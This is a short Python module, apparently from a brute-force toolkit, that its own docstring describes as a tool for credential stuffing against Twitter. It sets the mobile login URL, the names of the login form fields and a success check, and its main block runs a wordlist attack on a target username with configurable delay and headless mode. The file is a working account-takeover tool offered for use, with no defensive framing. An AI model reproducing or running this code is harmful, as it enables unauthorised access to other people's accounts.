# -*- coding: utf-8 -*-
"""
twitter.py

    Web-based module for credential stuffing Twitter

"""
import dataclasses

from brute.core.web import WebBruteforce


@dataclasses.dataclass
class Twitter(WebBruteforce):
    name = "twitter"
    url = "https://mobile.twitter.com/session/new"

    fields = {
        "username": "session[username_or_email]",
        "password": "session[password]",
    }

    @property
    def success(self):
        return "Twitter"


if __name__ == "__main__":
    args = Twitter.parse_args()
    br = Twitter(
        username = args.username,
        wordlist = args.wordlist,
        delay = args.delay,
        headless = args.headless
    ).run()
